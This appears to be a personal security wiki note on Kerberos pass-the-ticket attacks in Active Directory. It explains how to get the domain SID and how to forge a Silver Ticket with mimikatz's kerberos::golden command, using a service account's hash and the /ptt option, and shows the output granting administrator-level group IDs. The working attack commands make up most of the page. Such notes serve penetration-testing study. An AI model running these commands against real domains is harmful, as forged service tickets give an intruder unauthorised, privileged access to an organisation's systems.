---
title: Pass-The-Ticket
date: M02-18-2023
author: i4
---
- A TGT can only be used on the machine it was requested from (See [Kerberos](/wiki/Security/Windows/AD/Authentication/Kerberos.md))
- A TGS can be exported and used on others.
- Using a SPN account hash, a TGS can be forged with specific permissions (Silver Ticket)

## Getting the domain Security Identified

- Can be acquired by running `whoami /user` (remove the last `-xxxx` part)

A SID is a unique name for any object in AD and has the following structure: `S-R-X-Y`
**Example**: `S-1-5-21-2536614405-3629634762-1218571035-1116

| Field | Description |
|--|--|
|S| Indicates that the string is a SID|
|R| Indicates the revision level|
|X|Indicates the identifier authority value|
|Y|Represents a series of subauthority values, where _n_ is the number of values|

There are some special static SID that get used: [Well-Known SIDs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids)

## Crafting a Silver Ticket
- `/target` requires the SPN without the service 
	- Example `webserver.heimat.erde` (Remove the `HTTP/` part)
- `/service` requires the service part in the SPN
	- Example `HTTP`
 - `/ptt` load it into memory
 - `/rc4 | /sha1 | /sha256` hash (credential) of the SPN holder account
```
mimikatz # kerberos::purge # Clean cached tickets
mimikatz # kerberos::golden /user:[user] /domain:[domain] /sid:S-1-5-21-2536614405-3629634762-1218571035 /target:[SPN] /service:[service] /rc4:[credential] /ptt
...
User Id : 500
Groups Id: \*513 512 520 518 519
```
